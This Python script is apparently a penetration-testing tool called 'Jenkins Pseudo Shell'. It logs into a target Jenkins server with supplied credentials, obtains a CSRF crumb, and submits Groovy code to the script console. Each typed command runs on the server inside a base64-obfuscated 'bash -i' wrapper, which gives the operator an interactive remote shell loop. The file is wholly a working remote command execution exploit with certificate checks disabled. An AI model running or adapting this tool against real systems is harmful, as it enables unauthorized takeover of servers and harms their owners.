import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.osUtils as osu
import ZHOR_Modules.requestUtils as requ
import ZHOR_Modules.encodingUtils as encu   

import argparse
import requests
import sys
import readline
from bs4 import BeautifulSoup

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



_VERSION = "v141024"
parser = argparse.ArgumentParser(description="Jenkins Pseudo Shell " + _VERSION)
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Required arguments
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET"',type=str,required=True,help='Target host')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USER"',type=str,required=True,help='Users')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORD"',type=str,required=True,help='Passwords')

# Optional arguments
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ==================================================================================================================

HEADERS = None
USER = None
PASSWORD = None
URL = None
SESSION = requests.session()
CRUMB = None

#PROXYES = None
PROXYES = {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"}

def getCrumb():
    global SESSION
    global CRUMB

    r = SESSION.get(
    url = URL + '/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)',
     auth=(USER, PASSWORD),
     verify=False,
     proxies=PROXYES
    )
    print(r.text)
    CRUMB = r.text.split(':')[-1]

# bash -c {echo,bHMgLWFs}|{base64,-d}|{bash,-i}
def makePayload(command: str):
    global CRUMB

    # "bash encode"
    base64Command = encu.base64_encodeString(command)
    bashCommand = "bash -c {echo," + base64Command + "}|{base64,-d}|{bash,-i}"
    urlEncodedCommand = encu.urlEncode_encodeString(bashCommand)
    payload = "script=def%20sout%20%3d%20new%20StringBuilder()%2cserr%20%3d%20new%20StringBuilder()%3bdef%20proc%20%3d%20'§COMMAND§'.execute()%3bproc.consumeProcessOutput(sout%2c%20serr)%3bproc.waitForOrKill(1000)%3bprintln(%22out%3e%20%24sout%5cnerr%3e%20%24serr%22)&Submit=&Jenkins-Crumb=§CRUMB§&json=%7b%22script%22%3a%22def%20sout%20%3d%20new%20StringBuilder()%2cserr%20%3d%20new%20StringBuilder()%3bdef%20proc%20%3d%20'ls'.execute()%3bproc.consumeProcessOutput(sout%2c%20serr)%3bproc.waitForOrKill(1000)%3bprintln(%5c%22out%3e%20%24sout%5c%5cnerr%3e%20%24serr%5c%22)%22%2c%22%22%3a%22def%20sout%20%3d%20new%20StringBuilder()%2cserr%20%3d%20new%20StringBuilder()%3bdef%20proc%20%3d%20'ls'.execute()%3bproc.consumeProcessOutput(sout%2c%20serr)%3bproc.waitForOrKill(1000)%3bprintln(%5c%22out%3e%20%24sout%5c%5cnerr%3e%20%24serr%5c%22)%22%2c%22Submit%22%3a%22%22%2c%22Jenkins-Crumb%22%3a%22§CRUMB§%22%7d".replace("§COMMAND§",urlEncodedCommand).replace("§CRUMB§",CRUMB)

    return payload

def makeRequest(command: str):
    global HEADERS
    global SESSION
    r = SESSION.post(
        url=URL + "/script",
        data=makePayload(command),
        verify=False,
        proxies=PROXYES)
    
    soup = BeautifulSoup(r.content,'html.parser')
    preTags = soup.find_all('pre')

    return preTags[1].get_text()


if __name__ == '__main__':
    HEADERS = requ.requestFile2Headers('headers.txt')
    USER = args.u
    PASSWORD = args.p   
    URL = args.t

    getCrumb()

    while True:
        com = str(input(f"{URL} > "))
        print(makeRequest(com))